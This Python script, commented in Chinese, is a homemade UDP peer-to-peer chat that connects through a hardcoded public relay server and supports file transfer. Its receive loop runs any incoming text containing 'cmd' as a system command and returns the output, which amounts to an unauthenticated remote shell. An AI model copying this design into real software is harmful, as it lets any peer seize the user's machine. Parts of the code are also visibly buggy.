import os
import socket
import time
import json
from threading import Thread
import time
import datetime

sta = time.time()
upfile_if = 0
UDPSock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)   #创建一个socket的udp
xtjs = 0        #心跳失败统计到了3会自杀
data = 'hello'  #向服务器发送的内容(随便你写)
addr = ("134.175.226.31", 3386)   #定义一个元组用来存储服务端(Server)的地址
#tips：服务器必须是公网而且不封udp

 
#服务器端的数据发送接收以及对另一位客户端的链接
UDPSock.sendto(bytes(data.encode('utf-8')),addr)   #先给服务端(Server)发送一个包
dest,adr = UDPSock.recvfrom(1024)   #接收服务器发回来的对方数据
dest = str(dest,encoding="utf-8")   #对发回的数据执行转码bytes到str
print ('对方IP地址:' , dest)    #从服务器获取成功以后打印IP
up1 = (dest.split(':')[0], int(dest.split(':')[1]))     #定义一个元组用来存储IP


def msg_code(code=0,text=''):
    # 0 消息
    # 1 心跳发送
    # 2 收到心跳
    return json.dumps({'code':code,'data':text,'time':time.time()})


def sub_run_time(timetemp):
    start  = datetime.datetime.fromtimestamp(timetemp)
    run_time = datetime.datetime.now()-start
    return int(run_time.microseconds / 1000.0)

def cls(cmda):      #这个是用来定义功能模块的呐
    gn_list = {'cls':"cls", 'exit':"taskkill /pid "+ str(os.getpid()) + " -t -f",'cmd':cmda[3:]}   #功能区域的功能存储列表
    for k,v in gn_list.items():     #取得字典里面的key和value
        if k == cmda[1:]:           #判断传过来的命令在不在字典名字里面
            os.system(v)            #执行需要的命令
        elif k == cmda[0:3]:
            temp = os.popen(v).read()
            UDPSock.sendto(bytes(temp.encode('utf-8')), up1)

def threaded_function(arg):     #给对方发送数据的区域啦
    while True:                 #无限循环ing
        up_text = input("发送些什么呢:")    #输入啊 
        if '#' in up_text:       #判断是不是该给功能模块的
            cls(up_text)         #传输到功能模块
            up_text = ''         #重新定义为空
        elif 'upfile' in up_text:
            if os.path.isabs(up_text[6:]):
                path_temp,temp = os.path.split(up_text[6:])
                temp = 'tofile'+temp
            else:
                temp = 'tofile'+up_text[6:]
            print(temp)
            UDPSock.sendto(bytes(msg_code(0,temp.encode('utf-8'))), up1)
            upfile(up_text[6:])
            up_text = ''
        if up_text != '':        #判断内容为空就不传输给对方
            UDPSock.sendto(bytes(str(msg_code(0,up_text).encode('utf-8'))), (arg.split(':')[0], int(arg.split(':')[1])))    #发送数据给对方呐
        print("程序运行时间:",str(int(time.time()-sta)))
        time.sleep(1)                 #睡眠1秒钟
    print("被退出")              #如果上面循环出现错误这个就会被打印


def xt(arg):                    #心跳检测区域
    global xtjs                 #定义xtjs作为全局
    while True:                 #无限循环
        UDPSock.sendto(bytes(msg_code(1,'xt').encode('utf-8')), (arg.split(':')[0], int(arg.split(':')[1])))    #心跳发送啊
        xtjs = xtjs+1           #对全局的xtjs增加
        time.sleep(5)                #心跳的下一次执行时间
        if xtjs >= 3 and upfile_if == 0:           #判断xtjs是否等于或者大于3
            cls("#exit")        #大于或者等于3立即自杀

def upfile(file_name):
    global upfile_if
    upfile_if = 1
    a = 0
    filea = open(file_name,'rb')
    while True:
        a = a+1
        print(a)
        aaa = filea.read(1024)
        UDPSock.sendto(bytes(aaa), up1)
        print(len(aaa))
        if len(aaa) == 0:
            break
        time.sleep(0.001)
    filea.close()
    upfile_if = 0
    

def bcfile(file_name):
    a = 0
    filea1 = open(file_name,'wb')
    while True:
        a = a+1
        print(a)
        data,adr = UDPSock.recvfrom(10000)
        aaa = data
        filea1.write(aaa)
        #print(len(aaa))
        if len(aaa) == 0:
            break
        time.sleep(0.001)
    filea1.close()


#子线程启动区域
thread = Thread(target = threaded_function, args = (dest, ))    #消息线程
thread1 = Thread(target = xt, args = (dest, ))  #心跳线程
thread.start()  #启动线程
thread1.start() #启动线程




#用来接收对方发来的数据包 / 作为主线程存在
while True:
    data,adr = UDPSock.recvfrom(5000)
    #print(data)
    if str(data,encoding="utf-8") == dest:
        continue
    date = json.loads(str(data,encoding="utf-8"))
    print(str(sub_run_time(date['time']))+'ms')
    if 'xt' == date['data'] and date['code'] == 1:                                              #判断是不是心跳
        UDPSock.sendto(bytes(msg_code(2,'sdxt').encode('utf-8')), up1)                          #确认收到然后发回确认
    elif 'sdxt' == date['data'] and date['code'] == 2:                                          #对于返回确认的处理
        xtjs = 0                                                                                #重置心跳检测防止到3被关闭
    elif 'cmd' in str(data,encoding='utf-8'):
        cmda = str(data,encoding='utf-8')
        cls(cmda)
    elif 'tofile' in str(data,encoding='utf-8'):
        temp = str(data,encoding='utf-8')
        bcfile(temp[6:])
    else:                                                                                       #不是心跳都走这里呐
        if str(data,encoding='utf-8') != dest:                                                  #判断发送内容是不是IP数据
            print ('\n','收到消息:' , date['data'] , '来自:' ,adr[0])                            #数据打印
